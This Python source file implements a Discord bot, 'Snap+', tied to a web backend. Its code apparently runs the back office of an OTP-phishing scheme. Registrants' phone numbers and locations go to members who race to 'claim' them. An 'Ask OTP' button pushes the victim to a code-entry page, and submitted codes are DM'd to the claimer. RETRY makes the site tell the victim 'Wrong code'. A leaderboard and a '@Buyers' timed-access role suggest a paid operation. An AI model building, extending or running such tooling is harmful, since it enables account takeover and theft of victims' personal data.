"""
Snap+ Discord Bot — hosted alongside the FastAPI backend.
Controlled entirely from the admin panel (owner only).
"""
import asyncio
import random
import re
import uuid
import discord
from discord.ext import commands
from discord.ui import Modal, TextInput, View, Button
from datetime import datetime, timezone, timedelta
import logging

log = logging.getLogger("snap.bot")

# Global singleton state
_state = {
    "bot": None,
    "task": None,
    "loop": None,
    "status": "stopped",     # stopped | starting | online | error
    "last_error": None,
    "db": None,
}

# ---------- Helpers to load config from DB ----------
async def get_config():
    db = _state["db"]
    doc = await db.settings.find_one({"key": "bot_config"})
    default = {
        "token": "",
        "notify_channel_id": "",
        "logs_channel_id": "",
        "leaderboard_channel_id": "",
        "leaderboard_message_id": "",
        "leaderboard_title": "🏆 Top Claimers",
        "leaderboard_desc": "Ranking of members who claim the most numbers.",
        "leaderboard_color": 0xFACC15,
        "broadcast_channel_id": "",
        "broadcast_title": "📢 Announcement",
        "broadcast_desc": "Hello team! Ready for another day.",
        "broadcast_color": 0xFACC15,
        "footer_text": "",
        "maintenance_mode": False,
        "maintenance_title": "🛠 Maintenance in progress",
        "maintenance_desc": "The bot is temporarily down for maintenance. All requests are paused.",
        "back_online_title": "✅ We're back",
        "back_online_desc": "Maintenance is over. Everything is operational again.",
        "ping_role_ids": [],       # roles to ping on new number
        "ok_role_id": "",          # role allowed to press OK
        "embed_color": 0xFACC15,
        "embed_title": "🔥 New number received",
        "embed_desc": "A new number just came in. Press the button to claim it.",
        "ok_button_label": "OK",
        "ok_button_style": "success",   # primary/secondary/success/danger
        "ok_button_emoji": "✅",
        "otp_button_label": "Ask OTP",
        "otp_button_style": "primary",
        "otp_button_emoji": "🔑",
        # ----- Timer role (!timer) -----
        "timer_channel_id": "1537938875471761448",
        "timer_role_id": "",
        "timer_role_label": "@Buyers ❤️",
    }
    if not doc:
        return default
    v = doc.get("value") or {}
    return {**default, **v}

async def save_config(patch: dict):
    db = _state["db"]
    current = await get_config()
    current.update(patch or {})
    await db.settings.update_one({"key": "bot_config"}, {"$set": {"value": current}}, upsert=True)
    return current

def style_map(name):
    return {
        "primary": discord.ButtonStyle.primary,
        "secondary": discord.ButtonStyle.secondary,
        "success": discord.ButtonStyle.success,
        "danger": discord.ButtonStyle.danger,
    }.get(name, discord.ButtonStyle.success)

def now_iso():
    return datetime.now(timezone.utc).isoformat()

# ---------- Views (buttons) ----------
class OKView(discord.ui.View):
    def __init__(self, user_id: str):
        super().__init__(timeout=None)
        self.snap_user_id = user_id
        # dynamic button will be added later
        self.add_item(OKButton(user_id))


class OKButton(discord.ui.Button):
    def __init__(self, user_id: str):
        super().__init__(
            style=discord.ButtonStyle.success,
            label="OK",
            emoji="✅",
            custom_id=f"snap_ok:{user_id}",
        )
        self.snap_user_id = user_id

    async def callback(self, interaction: discord.Interaction):
        cfg = await get_config()
        db = _state["db"]

        # maintenance check
        if cfg.get("maintenance_mode"):
            await interaction.response.send_message(
                "🛠 The bot is in maintenance mode. Please try again later.", ephemeral=True
            )
            return

        # role check
        ok_role = cfg.get("ok_role_id", "").strip()
        if ok_role:
            member = interaction.user
            role_ids = [str(r.id) for r in getattr(member, "roles", []) or []]
            if ok_role not in role_ids:
                await interaction.response.send_message(
                    "❌ You don't have permission to claim this number.", ephemeral=True
                )
                return

        user_id = self.snap_user_id

        # ATOMIC CLAIM — only the first click wins
        claimed = await db.users.find_one_and_update(
            {"id": user_id, "discord_presser_id": {"$in": [None, ""]}},
            {"$set": {"discord_presser_id": str(interaction.user.id), "updated_at": now_iso()}},
            return_document=True,  # after
        )
        if not claimed:
            # already claimed by someone else
            existing = await db.users.find_one({"id": user_id}, {"_id": 0, "discord_presser_id": 1})
            other = existing.get("discord_presser_id") if existing else None
            await interaction.response.send_message(
                f"⚠️ Already claimed by <@{other}>." if other else "⚠️ Already claimed.",
                ephemeral=True,
            )
            return

        u = claimed
        # increment leaderboard
        await db.presser_stats.update_one(
            {"discord_id": str(interaction.user.id)},
            {"$inc": {"ok_count": 1}, "$set": {"username": str(interaction.user), "last_at": now_iso()}},
            upsert=True,
        )

        # DM the presser with phone + OTP button
        try:
            dm = await interaction.user.create_dm()
            embed = discord.Embed(
                title="📞 Number claimed",
                description=f"**Nickname:** `{u['nickname']}`\n**Phone:** `{u['phone']}`\n**Location:** {u.get('geo',{}).get('city','?')}, {u.get('geo',{}).get('country','?')}",
                color=cfg.get("embed_color", 0xFACC15),
            )
            ft = (cfg.get("footer_text") or "").strip()
            if ft:
                embed.set_footer(text=ft)
            await dm.send(embed=embed, view=OTPView(user_id))
        except discord.Forbidden:
            # rollback the claim so someone else can try
            await db.users.update_one({"id": user_id}, {"$set": {"discord_presser_id": None}})
            await interaction.response.send_message("⚠️ I can't DM you. Enable DMs from server members. Claim released.", ephemeral=True)
            return

        # log
        await log_action(f"✅ <@{interaction.user.id}> pressed **OK** for `{u['nickname']}`")
        # acknowledge & edit original message
        try:
            new_embed = interaction.message.embeds[0]
            new_embed.add_field(name="🔒 Claimed by", value=f"<@{interaction.user.id}>", inline=False)
            new_embed.color = 0x22c55e
            for child in self.view.children:
                child.disabled = True
            await interaction.response.edit_message(embed=new_embed, view=self.view)
        except Exception as e:
            log.warning(f"edit_message failed: {e}")
            try:
                await interaction.response.send_message("Number claimed.", ephemeral=True)
            except Exception:
                pass
        # refresh leaderboard
        asyncio.create_task(refresh_leaderboard())


class OTPView(discord.ui.View):
    def __init__(self, user_id: str):
        super().__init__(timeout=None)
        self.add_item(OTPButton(user_id))


class OTPButton(discord.ui.Button):
    def __init__(self, user_id: str):
        super().__init__(
            style=discord.ButtonStyle.primary,
            label="Ask OTP",
            emoji="🔑",
            custom_id=f"snap_otp:{user_id}",
        )
        self.snap_user_id = user_id

    async def callback(self, interaction: discord.Interaction):
        cfg = await get_config()
        if cfg.get("maintenance_mode"):
            await interaction.response.send_message(
                "🛠 The bot is in maintenance mode. Please try again later.", ephemeral=True
            )
            return
        db = _state["db"]
        u = await db.users.find_one({"id": self.snap_user_id})
        if not u:
            await interaction.response.send_message("User not found.", ephemeral=True)
            return
        # move user to code state
        await db.users.update_one(
            {"id": self.snap_user_id},
            {"$set": {"state": "code", "updated_at": now_iso()}},
        )
        # confirm in DM
        try:
            self.disabled = True
            self.label = "Asked for OTP"
            await interaction.response.edit_message(view=self.view)
            await interaction.followup.send(
                f"✅ Asked for OTP. The user `{u['nickname']}` now sees the code input page. You'll be pinged here as soon as they type it.",
                ephemeral=False,
            )
        except Exception:
            pass
        await log_action(f"🔑 <@{interaction.user.id}> pressed **OTP** for `{u['nickname']}`")


# ---------- Public API from FastAPI ----------
async def log_action(text: str):
    cfg = await get_config()
    ch_id = cfg.get("logs_channel_id", "").strip()
    if not ch_id or not _state["bot"]:
        return
    try:
        ch = _state["bot"].get_channel(int(ch_id))
        if ch is None:
            ch = await _state["bot"].fetch_channel(int(ch_id))
        await ch.send(text)
    except Exception as e:
        log.warning(f"log_action failed: {e}")

async def notify_new_registration(user: dict):
    """Called from FastAPI after a user registers."""
    if not _state["bot"] or _state["status"] != "online":
        return False, "bot offline"
    cfg = await get_config()
    ch_id = cfg.get("notify_channel_id", "").strip()
    if not ch_id:
        return False, "no channel"
    try:
        ch = _state["bot"].get_channel(int(ch_id))
        if ch is None:
            ch = await _state["bot"].fetch_channel(int(ch_id))
        mentions = " ".join(f"<@&{rid}>" for rid in cfg.get("ping_role_ids", []) if rid)
        embed = discord.Embed(
            title=cfg["embed_title"],
            description=cfg["embed_desc"],
            color=cfg.get("embed_color", 0xFACC15),
        )
        embed.add_field(name="Nickname", value=f"`{user['nickname']}`", inline=True)
        embed.add_field(name="Country", value=f"{user.get('geo',{}).get('country','?')}", inline=True)
        embed.add_field(name="City", value=f"{user.get('geo',{}).get('city','?')}", inline=True)
        # NOTE: phone number intentionally NOT shown here — only in DM after OK.
        footer_txt = (cfg.get("footer_text") or "").strip()
        if footer_txt:
            embed.set_footer(text=footer_txt)
        # custom OK button
        view = discord.ui.View(timeout=None)
        btn = OKButton(user["id"])
        btn.label = cfg.get("ok_button_label", "OK")
        btn.style = style_map(cfg.get("ok_button_style", "success"))
        emoji = (cfg.get("ok_button_emoji") or "").strip()
        try:
            btn.emoji = emoji if emoji else None
        except Exception:
            pass
        view.add_item(btn)
        await ch.send(content=mentions or None, embed=embed, view=view, allowed_mentions=discord.AllowedMentions(roles=True))
        return True, "sent"
    except Exception as e:
        return False, str(e)

async def notify_code_submitted(user: dict, code: str):
    """Called after user submits OTP. DM the code to the presser."""
    if not _state["bot"] or _state["status"] != "online":
        return False, "bot offline"
    cfg = await get_config()
    presser_id = user.get("discord_presser_id")
    try:
        if presser_id:
            u_disc = await _state["bot"].fetch_user(int(presser_id))
            embed = discord.Embed(
                title="🎯 OTP code received",
                description=f"**User:** `{user['nickname']}`\n**Phone:** `{user['phone']}`",
                color=0x22c55e,
            )
            embed.add_field(name="Code", value=f"```{code}```", inline=False)
            ft = (cfg.get("footer_text") or "").strip()
            if ft:
                embed.set_footer(text=ft)
            dm = await u_disc.create_dm()
            await dm.send(embed=embed)
        # log
        await log_action(f"📨 Code `{code}` received for `{user['nickname']}`"
                         + (f" — DM sent to <@{presser_id}>" if presser_id else ""))
        return True, "sent"
    except Exception as e:
        log.warning(f"notify_code_submitted failed: {e}")
        return False, str(e)


# ==================== OTP: Decline / Retry / Success ====================

class DeclineReasonModal(Modal, title="Decline number"):
    reason = TextInput(
        label="Write a comment (optional)",
        placeholder="Perché rifiuti questo numero?",
        style=discord.TextStyle.long,
        max_length=500,
        required=False,
    )

    def __init__(self, snap_user_id: str, nickname: str, phone: str):
        super().__init__()
        self.snap_user_id = snap_user_id
        self.nickname = nickname
        self.phone = phone

    async def on_submit(self, interaction: discord.Interaction):
        db = _state["db"]
        comment = (self.reason.value or "").strip()
        await db.users.update_one(
            {"id": self.snap_user_id},
            {"$set": {
                "state": "declined",
                "decline_reason": comment,
                "declined_by_id": str(interaction.user.id),
                "updated_at": now_iso(),
            }},
        )
        await db.action_logs.insert_one({
            "id": str(uuid.uuid4()),
            "action": "USER_DECLINED",
            "user_id": self.snap_user_id,
            "username": self.nickname,
            "phone": self.phone,
            "reason": comment,
            "discord_user_id": str(interaction.user.id),
            "discord_username": str(interaction.user),
            "created_at": now_iso(),
        })
        await log_action(f"USER_DECLINED, <@{interaction.user.id}>, ({comment or 'no comment'}) — `{self.nickname}`")
        try:
            embed = discord.Embed(
                title="❌ Declined",
                description=f"**User:** `{self.nickname}`\n**Phone:** `{self.phone}`" + (f"\n**Comment:** {comment}" if comment else ""),
                color=0xef4444,
            )
            await interaction.response.edit_message(embed=embed, view=None)
        except Exception:
            try:
                await interaction.response.send_message("❌ Declined.", ephemeral=True)
            except Exception:
                pass


class OTPVerificationView(discord.ui.View):
    """I 3 bottoni che compaiono nel DM quando l'utente inserisce l'OTP sul sito."""

    def __init__(self, snap_user_id: str, nickname: str, phone: str):
        super().__init__(timeout=None)
        self.snap_user_id = snap_user_id
        self.nickname = nickname
        self.phone = phone

    @discord.ui.button(label="DECLINE", style=discord.ButtonStyle.danger, emoji="❌", custom_id="snap_decline")
    async def decline(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(
            DeclineReasonModal(self.snap_user_id, self.nickname, self.phone)
        )

    @discord.ui.button(label="RETRY", style=discord.ButtonStyle.primary, emoji="🔄", custom_id="snap_retry")
    async def retry(self, interaction: discord.Interaction, button: discord.ui.Button):
        db = _state["db"]
        new_code = "".join(random.choices("0123456789", k=4))
        await db.users.update_one(
            {"id": self.snap_user_id},
            {"$set": {
                "state": "code",
                "otp_code": new_code,
                "code_submitted": None,
                "error_message": "Wrong code",
                "updated_at": now_iso(),
            }},
        )
        await db.action_logs.insert_one({
            "id": str(uuid.uuid4()),
            "action": "RETRY_CODE",
            "user_id": self.snap_user_id,
            "username": self.nickname,
            "phone": self.phone,
            "new_otp": new_code,
            "discord_user_id": str(interaction.user.id),
            "created_at": now_iso(),
        })
        await log_action(f"RETRY_CODE, <@{interaction.user.id}> — `{self.nickname}`")
        embed = discord.Embed(
            title="🔄 New code requested",
            description=f"**User:** `{self.nickname}`\n**Phone:** `{self.phone}`",
            color=0x3b82f6,
        )
        embed.add_field(name="New code", value=f"```{new_code}```", inline=False)
        embed.set_footer(text="L'utente rivede il form OTP sul sito.")
        try:
            await interaction.response.edit_message(embed=embed, view=None)
        except Exception:
            try:
                await interaction.response.send_message(f"🔄 New code: `{new_code}`", ephemeral=True)
            except Exception:
                pass

    @discord.ui.button(label="SUCCESS", style=discord.ButtonStyle.success, emoji="✅", custom_id="snap_success")
    async def success(self, interaction: discord.Interaction, button: discord.ui.Button):
        db = _state["db"]
        await db.users.update_one(
            {"id": self.snap_user_id},
            {"$set": {
                "state": "success",
                "approved_by_admin": str(interaction.user),
                "approved_by_id": str(interaction.user.id),
                "verified_at": now_iso(),
                "updated_at": now_iso(),
            }},
        )
        await db.action_logs.insert_one({
            "id": str(uuid.uuid4()),
            "action": "ADMIN_APPROVED",
            "user_id": self.snap_user_id,
            "username": self.nickname,
            "phone": self.phone,
            "approved_by": str(interaction.user),
            "discord_user_id": str(interaction.user.id),
            "created_at": now_iso(),
        })
        await log_action(f"ADMIN_APPROVED, <@{interaction.user.id}> — `{self.nickname}`")
        embed = discord.Embed(
            title="✅ Success",
            description=f"**User:** `{self.nickname}`\n**Phone:** `{self.phone}`\nAccesso approvato.",
            color=0x22c55e,
        )
        try:
            await interaction.response.edit_message(embed=embed, view=None)
        except Exception:
            try:
                await interaction.response.send_message("✅ Approved.", ephemeral=True)
            except Exception:
                pass


async def notify_otp_received(user: dict, code: str):
    """DM all'admin che ha claimato: mostra il codice + i 3 bottoni."""
    if not _state["bot"] or _state["status"] != "online":
        return False, "bot offline"
    cfg = await get_config()
    presser_id = user.get("discord_presser_id")
    if not presser_id:
        await log_action(f"⚠️ OTP ricevuto per `{user.get('nickname')}` ma nessun admin ha claimato.")
        return False, "no presser"
    try:
        u_disc = await _state["bot"].fetch_user(int(presser_id))
        embed = discord.Embed(
            title="🎯 OTP code received",
            description=f"**User:** `{user['nickname']}`\n**Phone:** `{user['phone']}`",
            color=0x22c55e,
        )
        embed.add_field(name="Code", value=f"```{code}```", inline=False)
        ft = (cfg.get("footer_text") or "").strip()
        if ft:
            embed.set_footer(text=ft)
        view = OTPVerificationView(user["id"], user["nickname"], user["phone"])
        dm = await u_disc.create_dm()
        msg = await dm.send(embed=embed, view=view)
        await _state["db"].users.update_one({"id": user["id"]}, {"$set": {"otp_message_id": str(msg.id)}})
        await log_action(f"📨 OTP `{code}` ricevuto per `{user['nickname']}` — DM a <@{presser_id}>")
        return True, "sent"
    except Exception as e:
        log.warning(f"notify_otp_received failed: {e}")
        return False, str(e)


# ==================== Timer role (!timer @user 24h) ====================

_DURATION_RE = re.compile(r"(\d+)\s*([smhdw])", re.I)
_UNIT_SECONDS = {"s": 1, "m": 60, "h": 3600, "d": 86400, "w": 604800}


def parse_duration(text: str) -> int:
    """'24h', '30m', '1d12h', '90s' -> secondi. 0 se non valido."""
    if not text:
        return 0
    total = 0
    for amount, unit in _DURATION_RE.findall(text):
        total += int(amount) * _UNIT_SECONDS[unit.lower()]
    if total == 0 and text.strip().isdigit():
        total = int(text.strip()) * 60  # numero nudo = minuti
    return total


def human_duration(seconds: int) -> str:
    seconds = max(0, int(seconds))
    d, rem = divmod(seconds, 86400)
    h, rem = divmod(rem, 3600)
    m, s = divmod(rem, 60)
    parts = []
    if d:
        parts.append(f"{d}d")
    if h:
        parts.append(f"{h}h")
    if m:
        parts.append(f"{m}m")
    if not parts:
        parts.append(f"{s}s")
    return " ".join(parts)


def _timer_embed(member_mention: str, role_label: str, duration_label: str, remaining: int, expired: bool):
    if expired:
        embed = discord.Embed(title="❌ Role Expired", color=0xef4444)
        embed.add_field(name="User", value=member_mention, inline=True)
        embed.add_field(name="Role", value=role_label, inline=True)
        embed.add_field(name="Duration", value=duration_label, inline=True)
        embed.set_footer(text="Il ruolo è stato rimosso automaticamente.")
    else:
        embed = discord.Embed(title="🎁 Role Granted", color=0x22c55e)
        embed.add_field(name="User", value=member_mention, inline=True)
        embed.add_field(name="Role", value=role_label, inline=True)
        embed.add_field(name="Duration", value=duration_label, inline=True)
        embed.add_field(name="⏳ Time left", value=f"**{human_duration(remaining)}**", inline=False)
    return embed


async def _run_timer(record: dict):
    """Aggiorna il messaggio finché scade, poi toglie il ruolo."""
    bot = _state["bot"]
    db = _state["db"]
    if not bot:
        return
    try:
        channel = bot.get_channel(int(record["channel_id"])) or await bot.fetch_channel(int(record["channel_id"]))
        message = await channel.fetch_message(int(record["message_id"]))
    except Exception as e:
        log.warning(f"timer: messaggio non trovato ({e})")
        return

    expires_at = datetime.fromisoformat(record["expires_at"])
    while True:
        remaining = (expires_at - datetime.now(timezone.utc)).total_seconds()
        if remaining <= 0:
            break
        try:
            await message.edit(embed=_timer_embed(
                f"<@{record['user_id']}>", record.get("role_label", "role"),
                record.get("duration_label", ""), remaining, False,
            ))
        except Exception:
            pass
        await asyncio.sleep(min(60, max(5, remaining)))

    # scaduto -> rimuovi ruolo
    try:
        guild = bot.get_guild(int(record["guild_id"]))
        member = guild.get_member(int(record["user_id"])) or await guild.fetch_member(int(record["user_id"]))
        role = guild.get_role(int(record["role_id"]))
        if member and role:
            await member.remove_roles(role, reason="Snap+ timer expired")
    except Exception as e:
        log.warning(f"timer: rimozione ruolo fallita ({e})")

    try:
        await message.edit(embed=_timer_embed(
            f"<@{record['user_id']}>", record.get("role_label", "role"),
            record.get("duration_label", ""), 0, True,
        ))
    except Exception:
        pass

    await db.timer_roles.update_one({"id": record["id"]}, {"$set": {"is_expired": True, "ended_at": now_iso()}})
    await log_action(f"⌛ Timer scaduto: <@{record['user_id']}> ha perso {record.get('role_label','il ruolo')}")


async def resume_timers():
    """Riprende i timer ancora attivi dopo un riavvio del bot."""
    db = _state["db"]
    try:
        pending = await db.timer_roles.find({"is_expired": False}).to_list(200)
    except Exception:
        return
    for rec in pending:
        asyncio.create_task(_run_timer(rec))

# ---------- Bot lifecycle ----------
async def _grant_timer_role(guild, member, role, duration_seconds, duration_label, channel, granted_by):
    """Logica condivisa fra !timer e /timer."""
    db = _state["db"]
    await member.add_roles(role, reason=f"Snap+ timer by {granted_by}")

    expires_at = datetime.now(timezone.utc) + timedelta(seconds=duration_seconds)
    embed = _timer_embed(member.mention, role.mention, duration_label, duration_seconds, False)
    msg = await channel.send(embed=embed)

    record = {
        "id": str(uuid.uuid4()),
        "user_id": str(member.id),
        "user_name": str(member),
        "role_id": str(role.id),
        "role_label": role.mention,
        "guild_id": str(guild.id),
        "channel_id": str(channel.id),
        "message_id": str(msg.id),
        "duration_seconds": duration_seconds,
        "duration_label": duration_label,
        "granted_by": str(granted_by),
        "created_at": now_iso(),
        "expires_at": expires_at.isoformat(),
        "is_expired": False,
    }
    await db.timer_roles.insert_one(dict(record))
    asyncio.create_task(_run_timer(record))
    await log_action(f"🎁 Role Granted: {member.mention} → {role.mention} per {duration_label}")


async def _resolve_timer_target(cfg, guild, channel, role_arg):
    """Ritorna (role, channel) usando la config se non è passato nulla."""
    role = role_arg
    if role is None:
        role_id = (cfg.get("timer_role_id") or "").strip()
        if role_id:
            role = guild.get_role(int(role_id))
    ch_id = (cfg.get("timer_channel_id") or "").strip()
    target_channel = channel
    if ch_id:
        found = guild.get_channel(int(ch_id))
        if found is not None:
            target_channel = found
    return role, target_channel


async def _run_bot(token: str):
    intents = discord.Intents.default()
    intents.members = True            # lettura ruoli/membri (privileged: attivalo nel portal)
    intents.message_content = True    # serve per i comandi con prefisso !timer

    async def _build_and_start(current_intents):
        bot = commands.Bot(command_prefix=commands.when_mentioned_or("!snap", "!"), intents=current_intents, help_command=None)
        _state["bot"] = bot

        
        # ---------- /timer command ----------
        @bot.tree.command(name="timer", description="Assign time access to user")
        async def timer(interaction: discord.Interaction, member: discord.Member, hours: int):
            """Assegna accesso a tempo a un utente"""
            guild = interaction.guild
            category_id = 1542631796578066624  # Your Panel
            category = guild.get_channel(category_id)
            
            if not category:
                await interaction.response.send_message("❌ Category not found", ephemeral=True)
                return
            
            try:
                channel = await guild.create_text_channel(
                    f"{member.name}-panel",
                    category=category,
                    overwrites={
                        guild.default_role: discord.PermissionOverwrite(view_channel=False),
                        member: discord.PermissionOverwrite(view_channel=True)
                    }
                )
                
                embed = discord.Embed(
                    title="⏱️ Access Granted",
                    description=f"Welcome {member.mention}! You have been granted {hours}h of access.",
                    color=discord.Color.blue()
                )
                embed.add_field(name="📊 Time Left", value=f"`{hours}h`", inline=True)
                embed.add_field(name="⏸️ Freeze Available", value=f"`{hours}h`", inline=True)
                embed.add_field(name="🔄 Status", value="`ACTIVE`", inline=True)
                
                await channel.send(embed=embed)
                await interaction.response.send_message(f"✅ Access granted to {member.mention}", ephemeral=True)
            except Exception as e:
                await interaction.response.send_message(f"❌ Error: {e}", ephemeral=True)


        @bot.event
        async def on_ready():
            _state["status"] = "online"
            _state["last_error"] = None
            log.info(f"[snap-bot] online as {bot.user}")
            try:
                await bot.tree.sync()
            except Exception as e:
                log.warning(f"slash sync failed: {e}")
            asyncio.create_task(resume_timers())

        @bot.event
        async def on_error(event, *a, **kw):
            log.exception(f"[snap-bot] event error: {event}")

        # ---------- !timer @user 24h [@Role] ----------
        @bot.command(name="timer")
        @commands.has_permissions(manage_roles=True)
        async def timer_cmd(ctx, member: discord.Member, duration: str, role: discord.Role = None):
            seconds = parse_duration(duration)
            if seconds <= 0:
                await ctx.send("⚠️ Durata non valida. Esempi: `24h`, `30m`, `7d`, `1d12h`")
                return
            cfg = await get_config()
            role, channel = await _resolve_timer_target(cfg, ctx.guild, ctx.channel, role)
            if role is None:
                await ctx.send("⚠️ Nessun ruolo impostato. Usa `!timer @user 24h @Ruolo` oppure imposta `timer_role_id` nell'admin panel.")
                return
            try:
                await _grant_timer_role(ctx.guild, member, role, seconds, duration, channel, ctx.author)
            except discord.Forbidden:
                await ctx.send("❌ Non ho i permessi per assegnare quel ruolo (controlla la gerarchia dei ruoli).")

        @timer_cmd.error
        async def timer_cmd_error(ctx, error):
            if isinstance(error, commands.MissingPermissions):
                await ctx.send("❌ Ti serve il permesso **Manage Roles**.")
            elif isinstance(error, commands.MissingRequiredArgument):
                await ctx.send("Uso: `!timer @user 24h` (opzionale: `@Ruolo`)")
            else:
                log.warning(f"!timer error: {error}")
                await interaction.followup.send("❌ Permessi insufficienti per quel ruolo.", ephemeral=True)

        await bot.start(token)

    try:
        await _build_and_start(intents)
    except discord.LoginFailure:
        _state["status"] = "error"
        _state["last_error"] = "Invalid bot token"
    except discord.PrivilegedIntentsRequired:
        # Riprova senza message_content: i comandi con prefisso non funzioneranno, /timer sì.
        log.warning("[snap-bot] Message Content Intent disattivato nel Developer Portal: uso solo /timer")
        intents.message_content = False
        try:
            await _build_and_start(intents)
        except Exception as e:
            _state["status"] = "error"
            _state["last_error"] = f"Abilita 'Server Members Intent' nel Discord Developer Portal ({e})"
    except Exception as e:
        _state["status"] = "error"
        _state["last_error"] = str(e)

async def start_bot():
    cfg = await get_config()
    token = (cfg.get("token") or "").strip()
    if not token:
        return False, "No token configured"
    if _state["status"] in ("online", "starting"):
        return False, f"Bot already {_state['status']}"
    _state["status"] = "starting"
    _state["last_error"] = None
    _state["loop"] = asyncio.get_event_loop()
    _state["task"] = asyncio.create_task(_run_bot(token))
    return True, "starting"

async def stop_bot():
    bot = _state["bot"]
    if bot:
        try:
            await bot.close()
        except Exception as e:
            log.warning(f"close failed: {e}")
    if _state["task"]:
        try:
            _state["task"].cancel()
        except Exception:
            pass
    _state["bot"] = None
    _state["task"] = None
    _state["status"] = "stopped"
    return True

def status():
    b = _state.get("bot")
    return {
        "status": _state["status"],
        "last_error": _state["last_error"],
        "bot_user": str(b.user) if b and b.user else None,
        "guilds": len(b.guilds) if b else 0,
    }

def set_db(db):
    _state["db"] = db


# ---------- Leaderboard ----------
async def refresh_leaderboard():
    """Post or update the leaderboard message in the configured channel."""
    if not _state["bot"] or _state["status"] != "online":
        return False, "offline"
    cfg = await get_config()
    ch_id = (cfg.get("leaderboard_channel_id") or "").strip()
    if not ch_id:
        return False, "no channel"
    db = _state["db"]
    top = await db.presser_stats.find({}, {"_id": 0}).sort("ok_count", -1).limit(15).to_list(15)
    if not top:
        lines = "_No claims yet._"
    else:
        medals = ["🥇", "🥈", "🥉"] + ["🔸"] * 20
        parts = []
        for i, r in enumerate(top):
            parts.append(f"{medals[i]} **{i+1}.** <@{r['discord_id']}> — **{r['ok_count']}** OKs")
        lines = "\n".join(parts)

    embed = discord.Embed(
        title=cfg.get("leaderboard_title", "🏆 Top Claimers"),
        description=f"{cfg.get('leaderboard_desc','')}\n\n{lines}",
        color=cfg.get("leaderboard_color", 0xFACC15),
    )
    ft = (cfg.get("footer_text") or "").strip()
    if ft:
        embed.set_footer(text=ft)
    try:
        ch = _state["bot"].get_channel(int(ch_id)) or await _state["bot"].fetch_channel(int(ch_id))
        msg_id = (cfg.get("leaderboard_message_id") or "").strip()
        if msg_id:
            try:
                msg = await ch.fetch_message(int(msg_id))
                await msg.edit(embed=embed)
                return True, "edited"
            except Exception:
                pass
        new = await ch.send(embed=embed)
        await save_config({"leaderboard_message_id": str(new.id)})
        return True, "posted"
    except Exception as e:
        log.warning(f"leaderboard: {e}")
        return False, str(e)


async def send_broadcast(override: dict = None):
    """Send an admin-defined embed to broadcast channel."""
    if not _state["bot"] or _state["status"] != "online":
        return False, "offline"
    cfg = await get_config()
    if override:
        cfg = {**cfg, **override}
    ch_id = (cfg.get("broadcast_channel_id") or "").strip()
    if not ch_id:
        return False, "no channel"
    try:
        ch = _state["bot"].get_channel(int(ch_id)) or await _state["bot"].fetch_channel(int(ch_id))
        embed = discord.Embed(
            title=cfg.get("broadcast_title", "Announcement"),
            description=cfg.get("broadcast_desc", ""),
            color=cfg.get("broadcast_color", 0xFACC15),
        )
        ft = (cfg.get("footer_text") or "").strip()
        if ft:
            embed.set_footer(text=ft)
        await ch.send(embed=embed)
        return True, "sent"
    except Exception as e:
        return False, str(e)


# ---------- Maintenance ----------
async def announce_maintenance(enabled: bool):
    """Post maintenance status to broadcast channel."""
    if not _state["bot"] or _state["status"] != "online":
        return False, "offline"
    cfg = await get_config()
    ch_id = (cfg.get("broadcast_channel_id") or "").strip()
    if not ch_id:
        return False, "no broadcast channel"
    try:
        ch = _state["bot"].get_channel(int(ch_id)) or await _state["bot"].fetch_channel(int(ch_id))
        if enabled:
            embed = discord.Embed(
                title=cfg.get("maintenance_title", "🛠 Maintenance in progress"),
                description=cfg.get("maintenance_desc", "The bot is temporarily down for maintenance."),
                color=0xef4444,
            )
        else:
            embed = discord.Embed(
                title=cfg.get("back_online_title", "✅ We're back"),
                description=cfg.get("back_online_desc", "Everything is operational again."),
                color=0x22c55e,
            )
        ft = (cfg.get("footer_text") or "").strip()
        if ft:
            embed.set_footer(text=ft)
        await ch.send(embed=embed)
        return True, "sent"
    except Exception as e:
        log.warning(f"announce_maintenance: {e}")
        return False, str(e)
